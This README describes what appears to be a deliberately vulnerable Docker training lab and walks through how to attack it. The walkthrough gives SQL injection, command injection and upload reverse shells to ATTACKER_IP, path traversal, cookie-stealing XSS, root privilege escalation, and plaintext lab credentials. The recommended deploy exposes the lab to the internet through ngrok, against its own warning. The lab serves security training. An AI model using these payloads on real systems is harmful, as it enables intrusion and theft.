# 🏢 VulnCorp — Intentionally Vulnerable Lab (Machine 1)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**

A self-contained Docker lab simulating a corporate web server with realistic vulnerabilities across three attack phases: **Initial Access → Privilege Escalation → Lateral Movement**.

---

## 🚀 Quick Start

### Option A: One-Command Deploy (Recommended)

Deploy on a **fresh Linux machine** (Ubuntu/Debian) with a single command.
This installs Docker, ngrok, builds the lab, and exposes it to the internet.

```bash
# Copy this project to your server, then:
chmod +x deploy.sh
sudo ./deploy.sh

# Or unattended (no prompts):
sudo NGROK_AUTHTOKEN=your_token_here ./deploy.sh
```

> Get a free ngrok token at: https://dashboard.ngrok.com/signup

### Option B: Manual Setup (Docker + ngrok sidecar)

```bash
# Build and run the lab
docker compose build
docker compose up -d

# Add ngrok tunnels as a sidecar container
NGROK_AUTHTOKEN=your_token_here docker compose --profile tunnel up -d

# Check your public URLs
curl -s http://localhost:4040/api/tunnels | python3 -m json.tool
```

### Option C: LAN Access Only (no tunnel)

```bash
docker compose build
docker compose up -d
# Access via your server's LAN IP (e.g. 192.168.1.x:8080)
```

### Access Points

| Service | Local | External (ngrok) |
|---------|-------|-------------------|
| **Web**  | `http://<SERVER_IP>:8080` | Shown after deploy / `http://localhost:4040` |
| **SSH**  | `ssh webuser@<SERVER_IP> -p 2222` (pw: `webuser123`) | — |
| **FTP**  | `ftp <SERVER_IP> 2121` (anonymous) | Shown after deploy |

### Tunnel Management

```bash
sudo ./tunnel.sh start      # Start ngrok tunnels
sudo ./tunnel.sh stop       # Stop tunnels
sudo ./tunnel.sh status     # Show current public URLs
sudo ./tunnel.sh restart    # Restart tunnels (new URLs)
```

---

## 🗺️ Attack Chain Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                     PHASE 1: INITIAL ACCESS                     │
│                                                                 │
│  Enumerate → SQLi / Command Injection / File Upload → Shell     │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│                   PHASE 2: PRIVILEGE ESCALATION                 │
│                                                                 │
│  webuser shell → SUID Binary / Writable Cron / Sudo → ROOT     │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│                   PHASE 3: LATERAL MOVEMENT                     │
│                                                                 │
│  Root access → Find creds in DB/files/SSH keys → Machine 2      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🔍 Phase 1: Initial Access (Web Vulnerabilities)

### 1A. SQL Injection — Login Bypass
**Location:** `/login` page  
**Vulnerability:** Raw SQL string formatting (no parameterized queries)

```
Username: admin' OR '1'='1' --
Password: anything
```

This bypasses authentication and logs you in as `admin`, giving access to the **Admin Panel** with internal credentials.

### 1B. Command Injection — Reverse Shell
**Location:** `/nettools` (Network Diagnostics)  
**Vulnerability:** User input passed directly to `subprocess.run(shell=True)`

```bash
# Test command injection
127.0.0.1; whoami

# Read sensitive files
127.0.0.1; cat /etc/passwd

# Reverse shell (replace ATTACKER_IP)
127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

**On your attacker machine:**
```bash
nc -lvnp 4444
```

### 1C. Unrestricted File Upload — Webshell
**Location:** `/upload`  
**Vulnerability:** No file type validation, uploaded files are made executable

Create a reverse shell script:
```bash
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Upload it as `shell.sh`, then execute via `/cgi/shell.sh`.

### 1D. Directory Traversal — File Read
**Location:** `/viewer?file=`  
**Vulnerability:** No path sanitization

```
/viewer?file=../../../etc/passwd
/viewer?file=../../../etc/shadow          # (world-readable!)
/viewer?file=../../../opt/vulncorp/config/database.yml
```

### 1E. Information Disclosure
- `/robots.txt` — reveals hidden paths (`/admin`, `/uploads`, `/viewer`)
- `/server-status` — exposes OS info, paths, internal IPs
- `/static/docs/todo.txt` — lists all known vulnerabilities

### 1F. Stored XSS
**Location:** `/notes`  
**Vulnerability:** Content rendered with `| safe` (no HTML escaping)

```html
<script>document.location='http://ATTACKER/steal?c='+document.cookie</script>
```

---

## 🔓 Phase 2: Privilege Escalation (webuser → root)

After getting a shell as `webuser`, read the **user flag**:
```bash
cat /home/webuser/user.txt
# Flag: VULN{w3b_sh3ll_1n1t1al_acc3ss}
```

### Enumeration Commands
```bash
# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check cron jobs
cat /etc/cron.d/*
ls -la /opt/scripts/

# Check shadow file permissions
ls -la /etc/shadow
```

### 2A. SUID Binary — PATH Hijack
**Binary:** `/usr/local/bin/vuln-backup` (SUID root)  
**Issue:** Calls `tar` without absolute path → PATH hijack

```bash
# Create malicious "tar" that spawns a root shell
echo '#!/bin/bash' > /tmp/tar
echo '/bin/bash -p' >> /tmp/tar
chmod +x /tmp/tar

# Prepend /tmp to PATH
export PATH=/tmp:$PATH

# Execute the SUID binary
/usr/local/bin/vuln-backup
# → drops into root shell!
```

### 2B. Writable Cron Job
**Script:** `/opt/scripts/cleanup.sh` (world-writable, runs every minute as root)

```bash
# Check permissions
ls -la /opt/scripts/cleanup.sh
# -rwxrwxrwx 1 root root ...

# Inject payload
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh

# Wait ~60 seconds for cron to execute
sleep 65

# Get root shell
/tmp/rootbash -p
```

### 2C. Sudo Misconfiguration (GTFOBins)

**webuser can run `find` as root:**
```bash
sudo /usr/bin/find /tmp -exec /bin/bash \;
```

**backup user can run `vim` as root:**
```bash
# First switch to backup user: su backup (password: backup2024)
sudo /usr/bin/vim -c ':!/bin/bash'
```

### Root Flag
```bash
cat /root/root.txt
# Flag: VULN{pr1v3sc_r00t_pwn3d_m4ch1n3_1}
```

---

## 🔀 Phase 3: Lateral Movement (→ Machine 2)

After getting root, find clues pointing to the next machine:

### 3A. Database Credentials
```bash
# SQLite database
sqlite3 /opt/vulncorp/db/vulncorp.db "SELECT * FROM internal_credentials;"
```

| Service | Host | Username | Password |
|---------|------|----------|----------|
| SSH | 192.168.56.102 | sysadmin | Pr0d#Server!99 |
| MySQL | 192.168.56.102 | root | toor_mysql@prod |
| FTP | 192.168.56.103 | ftpuser | ftp_upload#2024 |
| RDP | 10.10.10.50 | Administrator | W1nd0ws@Admin! |

### 3B. Root's Notes
```bash
cat /root/notes.txt
```

### 3C. SSH Keys & Config
```bash
cat /root/.ssh/config
# Shows connection profiles for db01 and fileserver
```

### 3D. Database Config File
```bash
cat /opt/vulncorp/config/database.yml
# MySQL credentials for production server
```

### 3E. FTP Files
```bash
cat /var/ftp/pub/network_map.txt
# Full internal network topology
```

---

## 🏗️ Architecture

```
webserver/
├── deploy.sh               # One-command deployment (Docker + ngrok)
├── tunnel.sh               # Tunnel management (start/stop/status)
├── Dockerfile              # Container build
├── docker-compose.yml      # Orchestration (with optional ngrok sidecar)
├── ngrok-docker.yml        # ngrok config for Docker sidecar mode
├── ngrok-vulncorp.yml      # ngrok config for standalone mode (auto-generated)
├── entrypoint.sh           # Service startup
├── app/
│   ├── app.py              # Vulnerable Flask application
│   ├── static/
│   │   ├── style.css       # Portal styling
│   │   └── docs/           # Viewable documents (with hints)
│   ├── templates/          # HTML templates
│   │   ├── index.html      # Landing page
│   │   ├── login.html      # Login (SQLi target)
│   │   ├── dashboard.html  # Dashboard
│   │   ├── nettools.html   # Network tools (cmd injection)
│   │   ├── upload.html     # File upload (webshell)
│   │   ├── viewer.html     # File viewer (dir traversal)
│   │   ├── notes.html      # Notes (stored XSS)
│   │   └── admin.html      # Admin panel (creds exposed)
│   └── uploads/            # Upload directory
└── setup/
    ├── setup_privesc.sh    # SUID, cron, sudo misconfigs
    ├── setup_services.sh   # SSH, FTP configuration
    └── setup_breadcrumbs.sh # Lateral movement clues
```

---

## 🧹 Cleanup

```bash
# Stop tunnels first
./tunnel.sh stop

# Remove the lab
docker compose down --rmi all --volumes
```

---

## 📋 Vulnerability Summary

| # | Vulnerability | Location | Impact |
|---|--------------|----------|--------|
| 1 | SQL Injection | `/login` | Auth bypass, data extraction |
| 2 | Command Injection | `/nettools` | Remote Code Execution (shell) |
| 3 | Unrestricted File Upload | `/upload` | Webshell upload & execution |
| 4 | Directory Traversal | `/viewer` | Arbitrary file read |
| 5 | Stored XSS | `/notes` | Session hijacking |
| 6 | Information Disclosure | `/robots.txt`, `/server-status` | Path/config leaks |
| 7 | Hardcoded Secret Key | `app.py` | Session forgery |
| 8 | Debug Mode Enabled | `app.py` | Stack traces, code exec |
| 9 | SUID Binary (PATH hijack) | `/usr/local/bin/vuln-backup` | Root shell |
| 10 | Writable Cron Job | `/opt/scripts/cleanup.sh` | Root code execution |
| 11 | Sudo Misconfiguration | `find` / `vim` as root | Root shell (GTFOBins) |
| 12 | World-readable Shadow | `/etc/shadow` | Offline password cracking |
| 13 | Plaintext Passwords | Database | Credential theft |
| 14 | Anonymous FTP | Port 21 | Network map disclosure |
| 15 | SSH Root Login | Port 22 | Direct root access if creds found |
| 16 | Credential Files | Multiple locations | Lateral movement to Machine 2 |
